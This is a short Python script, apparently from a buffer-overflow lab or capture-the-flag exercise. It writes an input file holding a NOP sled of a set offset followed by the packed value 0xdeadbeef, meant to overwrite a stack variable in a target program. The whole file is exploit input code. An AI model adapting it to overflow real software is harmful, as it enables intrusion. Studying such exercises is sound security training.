#!/usr/bin/python
# -*- coding: utf-8 -*-
# attack_input1.py
import sys
import struct

offset = 0x2c # modify it
key_value = 0xdeadbeef # modify it
## Put the shellcode at the begin
buf = (offset)*'\x90' + struct.pack('<I', key_value)
file = open('attack_input1', 'wb')
file.write("1\n")
file.write(buf)
file.close()
